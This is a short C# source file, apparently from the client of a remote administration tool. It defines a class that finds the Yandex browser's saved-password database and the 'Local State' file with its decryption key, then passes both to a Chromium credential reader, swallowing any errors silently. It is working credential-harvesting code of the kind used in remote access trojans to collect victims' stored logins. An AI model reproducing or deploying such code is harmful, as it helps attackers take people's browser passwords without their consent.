using RemoteAdmin.Shared;
using System;
using System.Collections.Generic;
using System.IO;

namespace RemoteAdmin.Client.Recovery.Browsers
{
    public class YandexPassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Yandex";

        /// <inheritdoc />
        public override List<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                "Yandex\\YandexBrowser\\User Data\\Default\\Ya Passman Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Yandex\\YandexBrowser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}